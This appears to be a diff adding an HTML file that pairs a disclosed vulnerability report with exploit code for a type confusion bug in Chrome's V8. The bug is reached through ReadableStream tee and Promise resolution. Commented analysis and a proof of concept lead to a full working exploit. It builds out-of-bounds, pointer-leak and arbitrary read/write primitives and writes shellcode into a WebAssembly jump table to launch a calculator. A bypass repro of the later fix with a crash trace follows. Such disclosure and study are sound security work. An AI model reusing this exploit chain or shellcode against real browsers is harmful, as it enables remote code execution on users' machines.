@@ -1,0 +1,555 @@
+<!--
+VULNERABILITY DETAILS
+==1. TriggerPromiseReactions==
+https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=d24c8dd69f1c7e89553ce101272aedefdb41110d&l=5975
+Handle<Object> JSPromise::TriggerPromiseReactions(Isolate* isolate,
+                                                  Handle<Object> reactions,
+                                                  Handle<Object> argument,
+                                                  PromiseReaction::Type type) {
+  DCHECK(reactions->IsSmi() || reactions->IsPromiseReaction());
+
+  // We need to reverse the {reactions} here, since we record them
+  // on the JSPromise in the reverse order.
+  {
+    DisallowHeapAllocation no_gc;
+    Object current = *reactions;
+    Object reversed = Smi::kZero;
+    while (!current->IsSmi()) {
+      Object next = PromiseReaction::cast(current)->next(); // ***1***
+      PromiseReaction::cast(current)->set_next(reversed);
+      reversed = current;
+      current = next;
+    }
+    reactions = handle(reversed, isolate);
+  }
+[...]
+
+A Semmle query has triggered a warning that |TriggerPromiseReactions| performs a
+typecast on the |reactions| argument without prior checks[1]. Upon further
+inspection, it turned out that the JSPromise class reuses a single field to
+store both the result object and the reaction list (chained callbacks).
+Moreover, |JSPromise::Fulfill| and |JSPromise::Reject| don't ensure that the
+promise is still in the "pending" state, instead they rely on the default
+|resolve/reject| callbacks that are exposed to user JS code and use the
+|PromiseBuiltins::kAlreadyResolvedSlot| context variable to determine whether
+the promise has been resolved yet. So, it's enough to call, for example,
+|JSPromise::Fulfill| twice on the same Promise object to trigger the type
+confusion.
+
+
+==2. Thenable objects and JSPromise::Resolve==
+https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=d24c8dd69f1c7e89553ce101272aedefdb41110d&l=5902
+MaybeHandle<Object> JSPromise::Resolve(Handle<JSPromise> promise,
+                                       Handle<Object> resolution) {
+[...]
+  // 8. Let then be Get(resolution, "then").
+  MaybeHandle<Object> then;
+  if (isolate->IsPromiseThenLookupChainIntact(
+          Handle<JSReceiver>::cast(resolution))) {
+    // We can skip the "then" lookup on {resolution} if its [[Prototype]]
+    // is the (initial) Promise.prototype and the Promise#then protector
+    // is intact, as that guards the lookup path for the "then" property
+    // on JSPromise instances which have the (initial) %PromisePrototype%.
+    then = isolate->promise_then();
+  } else {
+    then =
+        JSReceiver::GetProperty(isolate, Handle<JSReceiver>::cast(resolution),
+                                isolate->factory()->then_string()); // ***2***
+[...]    
+
+This is a known behavior, and yet it has already caused some problems in the
+past (see https://bugs.chromium.org/p/chromium/issues/detail?id=663476#c10).
+When the promise resolution is an object that has the |then| property, |Resolve|
+synchronously accesses that property and might invoke a user-defined getter[2],
+which means it's possible to run user JavaScript while the promise is in the
+middle of the resolution process. However, just calling the |resolve| callback
+inside the getter is not enough to trigger the type confusion because of the
+|kAlreadyResolvedSlot| check. Instead, one should look for places where
+|JSPromise::Resolve| is called directly.
+
+
+==3. V8 extras and ReadableStream==
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/streams/ReadableStream.js?rcl=d67a775151929f516380749eae3b32f514eade11&l=425
+  function ReadableStreamTee(stream) {
+    const reader = AcquireReadableStreamDefaultReader(stream);
+
+    let closedOrErrored = false;
+    let canceled1 = false;
+    let canceled2 = false;
+    let reason1;
+    let reason2;
+    const cancelPromise = v8.createPromise();
+
+    function pullAlgorithm() {
+      return thenPromise(
+          ReadableStreamDefaultReaderRead(reader), ({value, done}) => {
+            if (done && !closedOrErrored) {
+              if (!canceled1) {
+                ReadableStreamDefaultControllerClose(branch1controller); // ***3***
+              }
+              if (!canceled2) {
+                ReadableStreamDefaultControllerClose(branch2controller);
+              }
+              closedOrErrored = true;
+            }
+[...]
+    function cancel1Algorithm(reason) {
+      canceled1 = true; // ***4***
+      reason1 = reason;
+      if (canceled2) {
+        const cancelResult = ReadableStreamCancel(stream, [reason1, reason2]);
+        resolvePromise(cancelPromise, cancelResult);
+      }
+      return cancelPromise;
+    }
+[...]
+  function ReadableStreamCancel(stream, reason) {
+    stream[_readableStreamBits] |= DISTURBED;
+
+    const state = ReadableStreamGetState(stream);
+    if (state === STATE_CLOSED) {
+      return Promise_resolve(undefined);
+    }
+    if (state === STATE_ERRORED) {
+      return Promise_reject(stream[_storedError]);
+    }
+
+    ReadableStreamClose(stream);
+
+    const sourceCancelPromise =
+          ReadableStreamDefaultControllerCancel(stream[_controller], reason);
+    return thenPromise(sourceCancelPromise, () => undefined);
+  }
+
+  function ReadableStreamClose(stream) {
+    ReadableStreamSetState(stream, STATE_CLOSED);
+
+    const reader = stream[_reader];
+    if (reader === undefined) {
+      return;
+    }
+
+    if (IsReadableStreamDefaultReader(reader) === true) {
+      reader[_readRequests].forEach(
+          request =>
+            resolvePromise(
+                request.promise,
+                ReadableStreamCreateReadResult(undefined, true,
+                                               request.forAuthorCode)));
+      reader[_readRequests] = new binding.SimpleQueue();
+    }
+
+    resolvePromise(reader[_closedPromise], undefined);
+  }
+
+A tiny part of Blink (namely, Streams API) is implemented as a v8 extra, i.e., a
+set of JavaScript classes with a couple of internal v8 methods exposed to them.
+The relevant ones are |v8.resolvePromise| and |v8.rejectPromise|, as they just
+call |JSPromise::Resolve/Reject| and don't check the status of the promise
+passed as an argument. Instead, the JS code around them defines a bunch of
+boolean variables to track the stream's state. Unfortunately, there's a scenario
+in which the state checks could be bypassed:
+1. Create a new ReadableStream with an underlying source object that exposes the
+stream controller's |stop| method.
+2. Call the |tee| method to create a pair of child streams.
+3. Make a read request for one of the child streams thus putting a new Promise
+object to the |_readRequests| queue.
+4. Define a getter for the |then| property on Object.prototype. From this point
+every promise resolution where the resolution object inherits from
+Object.prototype will call the getter.
+5. Call |cancel| on the child stream. The call stack will eventually look like:
+ReadableStreamCancel -> ReadableStreamClose -> resolvePromise ->
+JSPromise::Resolve -> the |then| getter.
+6. Inside the getter, calling regular methods on the child stream won't work
+because its state is already set to "closed", but an attacker can call the
+controller's |stop| method. Because |ReadableStreamClose| is executed before the
+cancel callback[4], the |cancel1| flag won't be set yet, so the |close| method
+will be called again[3] resolving the promise that is currently in the middle
+of the resolution process.
+
+The only problem here is the code [3] gets executed as another promise's
+reaction, i.e. as a microtask, and microtasks are supposed to be executed
+asynchronously.
+
+
+==4. MicrotasksScope==
+V8 exposes the MicrotasksScope class to Blink to control microtask execution.
+MicrotasksScope's destructor will run all scheduled microtasks synchronously, if
+the object that's being destructed is the top-level MicrotasksScope.  Therefore,
+calling a Blink method that instantiates a MicrotasksScope should allow running
+the scheduled promise reaction[3] synchronously. However, usually all JS code
+(<script> body, event handlers, timeouts) already runs inside a MicrotasksScope.
+One way to overcome this is to define the JS code as the |handleEvent| property
+getter of an EventListener object and add the listener to, e.g., the |load|
+event.
+
+Putting it all together, the PoC is as follows:
+<body>
+<script>
+performMicrotaskCheckpoint = () => {
+  document.createNodeIterator(document, -1, {
+    acceptNode() {
+      return NodeFilter.FILTER_ACCEPT;
+  } }).nextNode();
+}
+
+runOutsideMicrotasksScope = func => {
+  window.addEventListener("load", { get handleEvent() {
+    func();
+  } });
+}
+
+runOutsideMicrotasksScope (() => {
+  let stream = new ReadableStream({ start(ctr) { controller = ctr } });
+  let tee_streams = stream.tee();
+  let reader = tee_streams[0].getReader();
+  reader.read();
+  let then_counter = 0;
+
+  Object.prototype.__defineGetter__("then", function() {
+    if (++then_counter == 1) {
+      controller.close();
+      performMicrotaskCheckpoint();
+    }
+  });
+  reader.cancel();
+});
+</script>
+</body>
+
+
+==5. Exploitation==
+The bug allows an attacker to make the browser treat the object of their choice
+as a PromiseReaction. If the second qword of the object contains a value that
+looks like a tagged pointer, |TriggerPromiseReactions| will treat it as a
+pointer to another PromiseReaction in the reaction chain and try to reverse the
+chain. This primitive is not very useful without a separate info leak bug. If
+the second qword looks like a Smi, the method will overwrite the first, third
+and fourth qwords with tagged pointers. So, if the attacker allocates a
+HeapNumber and a FixedDobuleArray that are adjacent to each other, and the
+umber's value has its LSB set to 0, the function will overwrite the array's
+length with a pointer that looks like a sufficiently large Smi. The array's map
+pointer will also get corrupted, but that's not important (at least, for release
+builds).
+
+-----------------------------------------------------------------
+|     HeapNumber    ||              FixedDoubleArray            |
+-----------------------------------------------------------------
+|    Map    | Value ||    Map    |   Length   | Element 0 | ... |
+-----------------------------------------------------------------
+
+Once the attacker has the relative read/write primitive, it's easy to construct
+the pointer leak and arbitrary read/write primitives by finding the offsets of a
+couple other objects allocated next to the array. Finally, to execute the
+shellcode the exploit overwrites the jump table of a WebAssembly function, which
+is stored in a RWX memory page.
+
+Exploit (the shellcode runs gnome-calculator on linux x64):
+-->
+
+<body>
+<script>
+performMicrotaskCheckpoint = () => {
+  document.createNodeIterator(document, -1, {
+    acceptNode() {
+      return NodeFilter.FILTER_ACCEPT;
+  } }).nextNode();
+}
+
+runOutsideMicrotasksScope = func => {
+  window.addEventListener("load", { get handleEvent() {
+    func();
+  } });
+}
+
+let data_view = new DataView(new ArrayBuffer(8));
+reverseDword = dword => {
+  data_view.setUint32(0, dword, true);
+  return data_view.getUint32(0, false);
+}
+
+reverseQword = qword => {
+  data_view.setBigUint64(0, qword, true);
+  return data_view.getBigUint64(0, false);
+}
+
+floatAsQword = float => {
+  data_view.setFloat64(0, float);
+  return data_view.getBigUint64(0);
+}
+
+qwordAsFloat = qword => {
+  data_view.setBigUint64(0, qword);
+  return data_view.getFloat64(0);
+}
+
+let oob_access_array;
+let ptr_leak_object;
+let arbirary_access_array;
+let ptr_leak_index;
+let external_ptr_index;
+const MARKER = 0x31337;
+
+leakPtr = obj => {
+  ptr_leak_object[0] = obj;
+  return floatAsQword(oob_access_array[ptr_leak_index]);
+}
+
+getQword = address => {
+  oob_access_array[external_ptr_index] = qwordAsFloat(address);
+  return arbirary_access_array[0];
+}
+
+setQword = (address, value) => {
+  oob_access_array[external_ptr_index] = qwordAsFloat(address);
+  arbirary_access_array[0] = value;
+}
+
+getField = (object_ptr, num, tagged = true) =>
+  object_ptr + BigInt(num * 8 - (tagged ? 1 : 0));
+
+setBytes = (address, array) => {
+  for (let i = 0; i < array.length; ++i) {
+    setQword(address + BigInt(i), BigInt(array[i]));
+  }
+}
+
+// ------------------------- \\
+
+runOutsideMicrotasksScope (() => {
+  oob_access_array = Array(16).fill(1.1);
+  ptr_leak_object = {};
+  arbirary_access_array = new BigUint64Array(1);
+  oob_access_array.length = 0;
+
+  const heap_number_to_corrupt = qwordAsFloat(0x10101010n);
+  oob_access_array[0] = 1.1;
+  ptr_leak_object[0] = MARKER;
+  arbirary_access_array.buffer;
+
+  let stream = new ReadableStream({ start(ctr) { controller = ctr } });
+  let tee_streams = stream.tee();
+  let reader = tee_streams[0].getReader();
+  reader.read();
+  reader.read();
+  let then_counter = 0;
+
+  Object.prototype.__defineGetter__("then", function() {
+    let counter_value = ++then_counter;
+    if (counter_value == 1) {
+      controller.close();
+      performMicrotaskCheckpoint();
+      throw 0x123;
+    } else if (counter_value == 2) { 
+      throw heap_number_to_corrupt;
+    } else if (counter_value == 4) {
+      oob_access_array.length = 60;
+      
+      findOffsets();
+      runCalc();
+    }
+  });
+  reader.cancel();
+});
+
+findOffsets = () => {
+  let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);
+  for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;
+      ++ptr_leak_index) {
+    if (oob_access_array[ptr_leak_index] === markerAsFloat) {
+      break;
+    }
+  }
+
+  let oneAsFloat = qwordAsFloat(1n << 32n);
+  for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;
+      ++external_ptr_index) {
+    if (oob_access_array[external_ptr_index - 2] === oneAsFloat &&
+        oob_access_array[external_ptr_index - 1] === 0) {
+      break;
+    }
+  }
+
+  if (ptr_leak_index === oob_access_array.length ||
+      external_ptr_index === oob_access_array.length) {
+    throw "Couldn't find the offsets";
+  }
+}
+
+runCalc = () => {
+  const wasm_code = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
+    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
+    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x41, 0x00, 0x0b
+  ]);
+  const wasm_instance = new WebAssembly.Instance(
+    new WebAssembly.Module(wasm_code));
+  const wasm_func = wasm_instance.exports.a;
+
+  const shellcode = [
+    0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
+    0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
+    0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,
+    0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
+    0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,
+    0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,
+    0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,
+    0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
+    0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
+  ];
+
+  wasm_instance_ptr = leakPtr(wasm_instance);
+  const jump_table = getQword(getField(wasm_instance_ptr, 32));
+  setBytes(jump_table, shellcode);
+  wasm_func();
+}
+</script>
+</body>
+
+<!--
+VERSION
+Google Chrome 72.0.3626.96 (Official Build) (64-bit)
+Google Chrome 74.0.3702.0 (Official Build) dev (64-bit)
+
+The Chrome team has landed a fix for the issue, but there's a way to bypass it.
+From Chromium's bug tracker:
+
+Sadly, there's still a way to bypass the latest fix. The fix prevents multiple resolution when all
+the calls come from the |v8.resolvePromise| or |v8.rejectPromise| method exposed to v8 extras.
+However, |ReadableStreamReaderGenericRelease| might use the regular |Promise.reject| method to
+create an initially rejected promise and store it in |reader[_closedPromise]|:
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/streams/ReadableStream.js?rcl=bf33c15cd092ea27c870a5a115d138700737cb5e&l=722
+  function ReadableStreamReaderGenericRelease(reader) {
+    // TODO(yhirano): Remove this when we don't need hasPendingActivity in
+    // blink::UnderlyingSourceBase.
+    const controller = reader[_ownerReadableStream][_controller];
+    if (controller[_readableStreamDefaultControllerBits] &
+        BLINK_LOCK_NOTIFICATIONS) {
+      // The stream is created with an external controller (i.e. made in
+      // Blink).
+      const lockNotifyTarget = controller[_lockNotifyTarget];
+      callFunction(lockNotifyTarget.notifyLockReleased, lockNotifyTarget);
+    }
+
+    if (ReadableStreamGetState(reader[_ownerReadableStream]) ===
+        STATE_READABLE) {
+      rejectPromise(
+          reader[_closedPromise],
+          new TypeError(errReleasedReaderClosedPromise));
+    } else {
+      reader[_closedPromise] =
+          Promise_reject(new TypeError(errReleasedReaderClosedPromise)); // ********
+    }
+
+Then, |ReadableStreamClose| might try to resolve it:
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/streams/ReadableStream.js?rcl=bf33c15cd092ea27c870a5a115d138700737cb5e&l=541
+  function ReadableStreamClose(stream) {
+    ReadableStreamSetState(stream, STATE_CLOSED);
+
+    const reader = stream[_reader];
+    if (reader === undefined) {
+      return;
+    }
+
+    if (IsReadableStreamDefaultReader(reader) === true) {
+      reader[_readRequests].forEach(
+          request =>
+            resolvePromise(
+                request.promise,
+                ReadableStreamCreateReadResult(undefined, true,
+                                               request.forAuthorCode)));
+      reader[_readRequests] = new binding.SimpleQueue();
+    }
+
+    resolvePromise(reader[_closedPromise], undefined); // ********
+  }
+
+It's not possible to call |ReadableStreamReaderGenericRelease| until the
+|reader[_readRequests]| queue is empty, so an attacker has to call the |close| method twice as in
+the original repro case. The call succeeds because |resolvePromise| acts a silent no-op.
+
+Since the promise is already rejected when it's passed to |v8.resolvePromise|, the code hits the
+assertion added to |PromiseInternalResolve| in the previous patch. It turns out that there's a
+JSCallReducer optimization for |v8.resolvePromise| that doesn't generate the same assertion,
+so the attacker can trigger optimization of |ReadableStreamCancel| to bypass the check:
+https://cs.chromium.org/chromium/src/v8/src/compiler/js-call-reducer.cc?rcl=fee9be7abb565fc2f2ae7c20e7597bece4fc7144&l=5727
+Reduction JSCallReducer::ReducePromiseInternalResolve(Node* node) {
+  DCHECK_EQ(IrOpcode::kJSCall, node->opcode());
+  Node* promise = node->op()->ValueInputCount() >= 2
+                      ? NodeProperties::GetValueInput(node, 2)
+                      : jsgraph()->UndefinedConstant();
+  Node* resolution = node->op()->ValueInputCount() >= 3
+                         ? NodeProperties::GetValueInput(node, 3)
+                         : jsgraph()->UndefinedConstant();
+  Node* frame_state = NodeProperties::GetFrameStateInput(node);
+  Node* context = NodeProperties::GetContextInput(node);
+  Node* effect = NodeProperties::GetEffectInput(node);
+  Node* control = NodeProperties::GetControlInput(node);
+
+  // Resolve the {promise} using the given {resolution}.
+  Node* value = effect =
+      graph()->NewNode(javascript()->ResolvePromise(), promise, resolution,
+                       context, frame_state, effect, control);
+
+  ReplaceWithValue(node, value, effect, control);
+  return Replace(value);
+}
+
+Repro:
+<body>
+<script>
+performMicrotaskCheckpoint = () => {
+  document.createNodeIterator(document, -1, {
+    acceptNode() {
+      return NodeFilter.FILTER_ACCEPT;
+  } }).nextNode();
+}
+
+runOutsideMicrotasksScope = func => {
+  window.addEventListener("load", { get handleEvent() {
+    func();
+  } });
+}
+
+for (let i = 0; i < 100000; ++i) {
+  let stream = new ReadableStream();
+  let reader = stream.getReader();
+  reader.cancel();
+}
+
+runOutsideMicrotasksScope (() => {
+  let stream = new ReadableStream({ start(ctr) { controller = ctr } });
+  let tee_streams = stream.tee();
+  let reader = tee_streams[0].getReader();
+  reader.read();
+  let then_counter = 0;
+
+  Object.prototype.__defineGetter__("then", function() {
+    if (++then_counter == 1) {
+      controller.close();
+      performMicrotaskCheckpoint();
+      reader.releaseLock();
+    }
+  });
+  reader.cancel();
+});
+</script>
+</body>
+
+(lldb) bt
+* thread #1, name = 'chrome', stop reason = signal SIGSEGV: address access protected (fault address: 0x30fd824804e8)
+  * frame #0: 0x0000555cf8057317 chrome`Builtins_RejectPromise + 55
+    frame #1: 0x0000555cf801f7cc chrome`Builtins_RunMicrotasks + 556
+    frame #2: 0x0000555cf7fff598 chrome`Builtins_JSRunMicrotasksEntry + 120
+    frame #3: 0x0000555cf7b3e405 chrome`v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) + 549
+    frame #4: 0x0000555cf7b3e895 chrome`v8::internal::(anonymous namespace)::InvokeWithTryCatch(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) + 101
+    frame #5: 0x0000555cf7b3e9fa chrome`v8::internal::Execution::TryRunMicrotasks(v8::internal::Isolate*, v8::internal::MicrotaskQueue*, v8::internal::MaybeHandle<v8::internal::Object>*) + 74
+    frame #6: 0x0000555cf7c8042b chrome`v8::internal::MicrotaskQueue::RunMicrotasks(v8::internal::Isolate*) + 427
+    frame #7: 0x0000555cfb5c13ba chrome`blink::Microtask::PerformCheckpoint(v8::Isolate*) + 58
+    frame #8: 0x0000555cfc5cc301 chrome`blink::(anonymous namespace)::EndOfTaskRunner::DidProcessTask(base::PendingTask const&) + 17
+-->
